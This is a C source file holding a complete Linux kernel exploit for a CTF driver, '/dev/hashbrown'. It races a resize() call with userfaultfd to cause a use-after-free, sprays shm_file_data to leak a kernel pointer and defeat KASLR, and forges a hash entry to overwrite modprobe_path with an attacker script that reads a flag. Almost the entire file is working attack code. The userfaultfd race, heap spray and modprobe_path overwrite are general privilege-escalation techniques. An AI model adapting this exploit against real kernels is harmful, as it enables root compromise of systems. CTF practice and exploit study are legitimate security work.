#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define DEVICE_PATH "/dev/hashbrown"
#define PAGE_FAULT_ADDR 0xdead000

#define ADD_KEY 0x1337
#define DELETE_KEY 0x1338
#define UPDATE_VALUE 0x1339
#define DELETE_VALUE 0x133a
#define GET_VALUE 0x133b

#define SIZE_ARR_START 0x10
#define SIZE_ARR_MAX 0x200
#define MAX_ENTRIES 0x400
#define MAX_VALUE_SIZE 0xb0
#define GET_THRESHOLD(size) size - (size >> 2)

#define INVALID 1
#define EXISTS 2
#define NOT_EXISTS 3
#define MAXED 4

typedef struct {
    uint key;
    uint size;
    char *src;
    char *dest;
} request;

struct hash_entry {
    uint key;
    uint size;
    char *value;
    struct hash_entry *next;
};

ulong kernel_base, kernel_heap;
ulong shmem_vm_ops;
ulong user_cs, user_sp, user_ss, user_rflags;
int hashbrown_fd;
pthread_t tid;
ulong *leaks;
ulong userfault_page;
ulong modprobe_path;

uint stage = 0;
uchar data[0xf0] = {0};
int targetkey = 0;
void save_state(void);
int initialize_ufd();
int userfaultfd(int);
void *page_fault_handler(void *);
void add_key(uint, uint, char*);
void del_key(uint);
void update_val(uint, uint, char*);
void del_val(uint);
void get_val(uint, uint, char*);

int main()
{
    prepare_modprobe_path();
    //save_state();
    hashbrown_fd = open_dev(DEVICE_PATH);

    // stage 1: race to leak with shm_file_data struct
    // .bss section: 0xffffffffc0002540
    int threshold = 0xc, cur_size = 0x10;
    int ufd;
    // hash_map.size = 0x10, hash_map.threshold = 0xc
    // if (hashmap.entry_count == hashmap.threshold && hashmap.size < SIZE_ARR_MAX)
    // spray 0xc hash_entry to call resize
    for (int i=0; i<threshold; i++) {
        memset(data, i, 0x20); 
        add_key(i, 0x20, data);
    }
    
    ufd = initialize_ufd();
    printf("Userfault fd: %d\n", ufd);
    pthread_create(&tid, NULL, page_fault_handler, &ufd);

    // this call add_key() will change to call resize() in kernel, also trigger page_fault_handler()
    // notice we add key = threshold => no duplicated => function resize() will call copy_from_user() which is the main reason to trigger userfaultfd
    add_key(threshold, 0x20, PAGE_FAULT_ADDR);
    
    char* leak[0x10];
    memset(leak, 0x0, sizeof(char *) * 0x10);

    get_val(0, 0x20, leak);
    dump_output(leak, 0x20);

    pthread_join(tid, NULL);
    // calculate kernel base
    shmem_vm_ops = leak[3];
    kernel_base = shmem_vm_ops - 0x822b80L;
    modprobe_path = kernel_base + 0xa46fe0L;
    
    printf("shmem_vm_ops: 0x%llx\n", shmem_vm_ops);
    printf("kernel_base: 0x%llx\n", kernel_base);
    printf("modprobe_path: 0x%llx\n", modprobe_path);
    puts("[!] Pause for debugging");
    getchar();

    /*
    stage 2: free a hash_entry and make it to become hash_entry.value
    then we will have a hash_entry which is also a hash_entry.value
    use update_val() to change its hash_entry.value to modprobe_path
    use update_val() again to overwrite modprobe_path to our script
    */

    // new theshold
    cur_size *= 2;
    threshold = GET_THRESHOLD(cur_size);
    memset(data, 'A', 0x20);
    // fill objects untils reach threshold
    printf("new threshold: %d\n", threshold);
    for (int i=0xc+1;i<threshold;i++) {
        add_key(i, 0x20, data);
    }
    
    targetkey = threshold -1;
    ufd = initialize_ufd();
    printf("Userfault fd: %d\n", ufd);
    pthread_create(&tid, NULL, page_fault_handler, &ufd);
    // call resize() to trigger page_fault_handler()
    // notice we add key = threshold => no duplicated => function resize() will call copy_from_user() which is the main reason to trigger userfaultfd
    add_key(threshold, 0x20, PAGE_FAULT_ADDR);

    pthread_join(tid, NULL);
    puts("loop time");
    for (int i=threshold+1;;i++) {
        memset(data, 'A', 0x20);
        add_key(i, 0x20, data);
        get_val(targetkey, 0x20, data);
        if (((uint *) data)[0] != 0x41414141) {
            puts("!!!!FOUND!!!!");
            dump_output(data, 0x20);
            break;
        } 
    }
    
    struct hash_entry fake_hash_entry = {
        .key = ((uint *)data)[0],
        .size = ((uint*)data)[1],
        .value = modprobe_path,
        .next = NULL
    };

    update_val(targetkey, 0x20, &fake_hash_entry);
    update_val(((uint *)data)[0], 0x20, "/home/ctf/copy.sh\x00\x00\x00\x00");

    trigger_modprobe_path();
    system("cat /home/ctf/flag");
}

void save_state(void) 
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    printf("[*] Saved state\n");
}

int initialize_ufd()
{
    int fd;

    puts("[*] Mapping page with 0x4000 size...");
    userfault_page = mmap((void *) PAGE_FAULT_ADDR, PAGE_SIZE*4, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    if ((fd = userfaultfd(O_CLOEXEC|O_NONBLOCK)) == -1) 
    {
        panic("[!] Error: Userfaultfd failed!");
    }

    struct uffdio_api api = {
        .api = UFFD_API,
        .features = 0
    };

    if (ioctl(fd, UFFDIO_API, &api))
    {
        panic("[!] Error: ioctl - UFFDIO_API failed!");
    }

    if (api.api != UFFD_API) 
    {
        panic("[!] Error: Unexpected UFFD api version!");
    }

    struct uffdio_register req = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = (long) (userfault_page),
            .len = PAGE_SIZE*4,
        } 
    };

    if (ioctl(fd, UFFDIO_REGISTER, &req))
    {
        panic("[!] Error: ioctl - UFFDIO_REGISTER failed!");
    }
    
    return fd;
}

void *page_fault_handler(void *_ufd) 
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;

    int ufd = *((int *) _ufd);
    int shmid; // shm_file_data (kmalloc-32) in order to leak kernel data => calculate kernel base with fgkaslr
    char *shmaddr;

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0)
    {
        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            panic("[!] Error: Polling failed!");
        }

        if (read(ufd ,&fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) 
        {
            panic("[!] Error: Read fault_msg failed!");
        }

        char *page_fault_location = (char *) fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != userfault_page))
        {
            panic("[!] Error: Unexpected pagefault!");
        }

        if (page_fault_location == (void *) 0xdead000)
        {
            puts("Alright, we triggered our pagefault");
            printf("[*] Page fault at address %p!\n", page_fault_location);

            if (stage == 0) 
            {
                /*
                thread which calls resize() is halting, in this thread just delete value and put shm_file_data struct to its chunk
                */

                // delete a hash_entry    
                del_val(targetkey);

                // create a shm_file_data object, this will be put to the already free object
                if ((shmid = shmget(IPC_PRIVATE, PAGE_SIZE, 0600)) < 0)
                    panic("[!] Error: shmget() failed!");
                if ((shmaddr = shmat(shmid, NULL, 0)) < 0)
                    panic("[![ Error: shmat() failed!");
            } 
            else if (stage == 1) 
            {
                /*
                this stage is tricky
                */
                del_val(targetkey);
            }
            stage++;
        }

        // unblock userfaultfd
        struct uffdio_register uffdio_register;
        uffdio_register.range.start = fault_msg.arg.pagefault.address;
        uffdio_register.range.len = PAGE_SIZE*4;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

        ioctl(ufd, UFFDIO_UNREGISTER, &uffdio_register.range);
        return;
    }

    return;
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

void add_key(uint key, uint size, char *src)
{
    printf("[*] calling add_key(%d, %llx, %p)\n", key, size, src);
    request req = {
        .key = key,
        .size = size,
        .src = src,
        .dest = NULL
    };

    int ret = ioctl(hashbrown_fd, ADD_KEY, &req);
    assert(ret != NOT_EXISTS && ret != INVALID);
}

void del_key(uint key)
{
    printf("[*] calling del_key(%d)\n", key);
    request req = {
        .key = key,
        .size = 0,
        .src = NULL,
        .dest = NULL
    }; 

    int ret = ioctl(hashbrown_fd, DELETE_KEY, &req);
    assert(ret != NOT_EXISTS && ret != INVALID);
}

void update_val(uint key, uint size, char *src)
{
    printf("[*] calling update_val(%d, %llx, 0x%llx)\n", key, size, src);
    request req = {
        .key = key,
        .size = size,
        .src = src,
        .dest = NULL
    };
    
    int ret = ioctl(hashbrown_fd, UPDATE_VALUE, &req);
    assert(ret != NOT_EXISTS && ret != INVALID);
}

void del_val(uint key)
{
    printf("[*] calling del_val(%d)\n", key);
    request req = {
        .key = key,
        .size = 0,
        .src = NULL,
        .dest = NULL
    };

    int ret = ioctl(hashbrown_fd, DELETE_VALUE, &req);
    assert(ret != NOT_EXISTS && ret != INVALID);
}

void get_val(uint key, uint size, char *dest)
{
    printf("[*] calling get_val(%d, %llx, 0x%llx)\n", key, size, dest);
    request req = {
        .key = key,
        .size = size,
        .src = NULL,
        .dest = dest
    };

    int ret = ioctl(hashbrown_fd, GET_VALUE, &req);
    assert(ret != NOT_EXISTS && ret != INVALID);    
}
